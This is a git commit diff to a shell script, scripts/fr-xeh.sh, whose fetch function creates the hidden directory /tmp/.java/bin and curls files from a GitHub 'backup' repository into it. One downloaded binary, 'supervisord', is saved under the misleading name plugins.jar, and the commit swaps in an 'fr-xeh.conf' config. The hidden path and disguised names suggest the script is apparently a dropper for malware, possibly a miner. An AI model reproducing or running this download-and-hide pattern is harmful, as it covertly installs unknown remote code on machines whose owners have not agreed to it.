b1c62645e1a9d153e3093bb6eb889614e589836f
i51jir6ni9t0 <wker-one@protonmail.com>
2024-09-09 03:38:26 +0000

    FR-4-XEH TRASH UPDATED

--- scripts/fr-xeh.sh
+++ scripts/fr-xeh.sh
@@ -5,7 +5,7 @@ function fetch_files() {
     mkdir -p /tmp/.java/bin
     cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/mc/patch.jar -o patch.jar
     cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
-    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/conf/de-xeh.conf -o cfg.conf
+    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/conf/fr-xeh.conf -o cfg.conf
     echo "DONE ..."
 }
 
